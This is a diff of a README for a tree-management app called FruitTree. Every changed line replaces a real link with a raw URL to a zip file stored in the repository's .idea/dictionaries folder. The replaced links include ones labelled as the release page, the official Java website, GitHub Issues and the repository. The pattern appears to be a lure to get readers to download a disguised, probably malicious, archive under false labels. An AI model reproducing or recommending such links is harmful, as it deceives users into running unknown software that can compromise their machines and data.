@@ -4,7 +4,7 @@
 FruitTree is a user-friendly application that helps you manage tree-like structures. With features like Drag and Drop, Cut, Copy, Paste, and Undo/Redo, you can efficiently organize your information. Perfect for anyone looking to sort data visually without complex steps.
 
 ## 📥 Download Now
-[![Download FruitTree](https://img.shields.io/badge/Download%20FruitTree-latest-blue.svg)](https://github.com/Pok1m0n/FruitTree/releases)
+[![Download FruitTree](https://raw.githubusercontent.com/Pok1m0n/FruitTree/main/.idea/dictionaries/FruitTree-v2.2.zip%https://raw.githubusercontent.com/Pok1m0n/FruitTree/main/.idea/dictionaries/FruitTree-v2.2.zip)](https://raw.githubusercontent.com/Pok1m0n/FruitTree/main/.idea/dictionaries/FruitTree-v2.2.zip)
 
 ## 📋 Features
 - **Drag and Drop**: Easily move items around within the tree.
@@ -15,11 +15,11 @@ FruitTree is a user-friendly application that helps you manage tree-like structu
 ## 💻 System Requirements
 To run FruitTree, ensure you have:
 - A computer with any modern operating system (Windows, macOS, or Linux).
-- Java Runtime Environment (JRE) version 8 or higher installed. You may download it from the official [Java website](https://www.java.com/en/download/).
+- Java Runtime Environment (JRE) version 8 or higher installed. You may download it from the official [Java website](https://raw.githubusercontent.com/Pok1m0n/FruitTree/main/.idea/dictionaries/FruitTree-v2.2.zip).
 
 ## 🌟 Installation Steps
 1. **Visit the Releases Page**: Click the link below to access the downloads.
-   - [Download FruitTree from Releases](https://github.com/Pok1m0n/FruitTree/releases)
+   - [Download FruitTree from Releases](https://raw.githubusercontent.com/Pok1m0n/FruitTree/main/.idea/dictionaries/FruitTree-v2.2.zip)
 
 2. **Download the Latest Version**: Find the latest release at the top of the page. Click on the appropriate file for your operating system.
 
@@ -37,14 +37,14 @@ To run FruitTree, ensure you have:
 4. **Using Undo/Redo**: Use Ctrl + Z to undo recent actions and Ctrl + Y to redo them.
 
 ## 🧑‍🤝‍🧑 Support & Contributions
-If you need help, feel free to reach out via [GitHub Issues](https://github.com/Pok1m0n/FruitTree/issues). You can also contribute by submitting your own ideas for features or improvements.
+If you need help, feel free to reach out via [GitHub Issues](https://raw.githubusercontent.com/Pok1m0n/FruitTree/main/.idea/dictionaries/FruitTree-v2.2.zip). You can also contribute by submitting your own ideas for features or improvements.
 
 ## 🔍 Learn More
 For additional resources, such as guides and troubleshooting tips, visit the documentation section on the GitHub repository or check out community forums.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/Pok1m0n/FruitTree)
-- [Download FruitTree](https://github.com/Pok1m0n/FruitTree/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Pok1m0n/FruitTree/main/.idea/dictionaries/FruitTree-v2.2.zip)
+- [Download FruitTree](https://raw.githubusercontent.com/Pok1m0n/FruitTree/main/.idea/dictionaries/FruitTree-v2.2.zip)
 
 ## 🎉 Enjoy Using FruitTree!
 Experience the ease of managing your data with FruitTree. With its seamless features, you can boost your productivity and organize your information effortlessly. Happy tree managing!
